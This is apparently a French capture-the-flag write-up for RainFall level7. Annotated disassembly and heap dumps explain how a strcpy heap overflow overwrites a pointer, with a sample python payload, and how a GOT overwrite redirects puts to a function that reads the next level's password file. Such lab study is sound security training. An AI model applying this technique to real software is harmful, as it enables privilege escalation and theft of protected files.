    __               _______
   / /__ _   _____  / /__  /
  / / _ \ | / / _ \/ /  / / 
 / /  __/ |/ /  __/ /  / /  
/_/\___/|___/\___/_/  /_/   
                     

>$level7@RainFall:~$ ./level7
Segmentation fault (core dumped)

>$level7@RainFall:~$ ./level7 AAAA
Segmentation fault (core dumped)

>$level7@RainFall:~$ ./level7 AAAA BBBB
~~

>$level7@RainFall:~$ ./level7 AAAA BBBB ....
~~

On lance le binaire et on se rend compte qu'il écrit sur l'entrée standard "~~" lorsqu'on saisis deux ou plus d'arguments sinon il SEGFAULT.


>$ (gdb) objdump -d level5 

On peut voir un looooooong <main>. Il y'a aussi une fonction <m> laissé-pour-compte quin'est pas appellée dans le <main>, mais qui est intéressante.
Étudions donc ces éléments:
___________________________________________________________________________________________________________________________________________________________________
(gdb) disas main						|
Dump of assembler code for function main:			|	
   0x08048521 <+0>:	push   %ebp				|	
   0x08048522 <+1>:	mov    %esp,%ebp			|	
   0x08048524 <+3>:	and    $0xfffffff0,%esp			|	
   0x08048527 <+6>:	sub    $0x20,%esp			|	
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------
   0x0804852a <+9>:	movl   $0x8,(%esp)			|	MALLOC PATTERN									|
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>  (1a)	|											|
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)         (2a)	|	(1) Allouer un malloc1() de size 8						|	
   0x0804853a <+25>:	mov    0x1c(%esp),%eax	       		| 	(2) Stocker l'adresse de malloc1() -> X1 	(start) Debut de la heap	|						
   0x0804853e <+29>:	movl   $0x1,(%eax)	       (3a)	|	(3) Ajoutez le rank   				(end) Fin de la heap		|
   0x08048544 <+35>:	movl   $0x8,(%esp)			|	(4) Allouer un malloc2() de size 8              				|
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>  (4a)	|	(5) Stocker l'adresse de malloc2() -> X1 + 0x4					|
   0x08048550 <+47>:	mov    %eax,%edx			|											|
   0x08048552 <+49>:	mov    0x1c(%esp),%eax			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018	|
   0x08048556 <+53>:	mov    %edx,0x4(%eax)	       (5a)	|			(start)				(1a)(3a)	(5a)		|
   0x08048559 <+56>:	movl   $0x8,(%esp)			|	0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000	|
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>  (1b)	|							(4a)				|
   0x08048565 <+68>:	mov    %eax,0x18(%esp)	       (2b)	|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038	|
   0x08048569 <+72>:	mov    0x18(%esp),%eax			|							(1b)(3b)	(5b)		|
   0x0804856d <+76>:	movl   $0x2,(%eax)	       (3b)	|	0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000	|
   0x08048573 <+82>:	movl   $0x8,(%esp)			|							(4b)				|
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>  (4b)	|	0x804a040:	0x00000000	0x00020fc1					|
   0x0804857f <+94>:	mov    %eax,%edx			|					(end)						|
   0x08048581 <+96>:	mov    0x18(%esp),%eax			|											|
   0x08048585 <+100>:	mov    %edx,0x4(%eax)	       (5b)	|	Le pattern se répète donc deux fois (a) & (b).					|
   --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   0x08048588 <+103>:	mov    0xc(%ebp),%eax	      AV[0]	|	STRCPY PATTERN											On tente ici de réérire sur l'adressse du malloc2 avec une adresse de notre choix 0xbfffffff.
   0x0804858b <+106>:	add    $0x4,%eax    AV[0]+4 = AV[1]	|													On récupère (a)l'argument AV[1] = "$(python -c 'print( 20 * "A" + "\xff\xff\xff\xbf")')".
   0x0804858e <+109>:	mov    (%eax),%eax			|	(1) On récupère (a)l'argument AV[1] "AAAA" / (b)l'argument AV[2] "BBBB" 			AV[1] overwrite toutes les adresses de jusqu'a celle du malloc2 et la remplace par celle souhaitée.
   0x08048590 <+111>:	mov    %eax,%edx	       (1a)	|	(2) On récupère l'adresse du malloc2()								AV[2] sera donc écris à l'adresse 0xbfffffff.    				   
   0x08048592 <+113>:	mov    0x1c(%esp),%eax 			|	(3) On appelle strcpy() avec pour argument (1) et (2)
   0x08048596 <+117>:	mov    0x4(%eax),%eax  	       (2a)	|
   0x08048599 <+120>:	mov    %edx,0x4(%esp)			|	Heap après le premier pattern :									Après tentative de réécriture: 
   0x0804859d <+124>:	mov    %eax,(%esp)			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018			0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>  (3a)	|	0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000			0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038			0x804a020:	0x41414141	0x41414141	0x41414141	0xbfffffff
   0x080485a8 <+135>:	add    $0x8,%eax    AV[0]+8 = AV[2]	|	0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000			0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
   0x080485ab <+138>:	mov    (%eax),%eax			|													SUCCESS !!
   0x080485ad <+140>:	mov    %eax,%edx	       (1b)	|	Heap après le second pattern :
   0x080485af <+142>:	mov    0x18(%esp),%eax			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 --------------------> adresse malloc1 
   0x080485b3 <+146>:	mov    0x4(%eax),%eax	       (2b)	|	0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 --------------------> adresse malloc2
   0x080485ba <+153>:	mov    %eax,(%esp)			|	0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000	suite
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>  (3b)	|											-------->
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   0x080485c2 <+161>:	mov    $0x80486e9,%edx		(1) 0x80486e9 = "r"
   0x080485c7 <+166>:	mov    $0x80486eb,%eax		(2) 0x80486eb = "/home/user/level8/.pass"
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>	(3) La fonction fopen() ouvre le fichier .pass et renvoie un file descriptor 
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)		(4) Le fd est push en argument à fgets()
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)		(5) ainsi qu'une size
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)	(6) et une variable <c> qui contient une chaine vide sensé acceuillir le contenu de .pass
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>	(WARNING) GDB drop les privilèges -> pas de suid, pas de droit sur le fichier .pass, fopen() renvoie donc 
   							NULL, que nous donnons comme argument à fgets(), qui recoit un signal SIGSEGV, Segmentation fault. Dès lors 
							il va falloir faire sans GDB.
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)	
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>	(7) Nous renvoie les "~~" cette fonction nous est d'aucune utilité. Réutilisons l'exploit GOT. 
   			--------------------------------------------------------------------------------------------------------------------------------------------
			Nous allons utiliser la methodologie du level5. Nous allons modifier la GOT en remplacant l'adresse sensé contenir puts() par l'adresse 
			de notre fonction <m> :
			
			(gdb) disas puts
			Dump of assembler code for function puts@plt:
   				0x08048400 <+0>:	jmp    *0x8049928
   				0x08048406 <+6>:	push   $0x28
   				0x0804840b <+11>:	jmp    0x80483a0
			End of assembler dump.
			
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
   
   
   
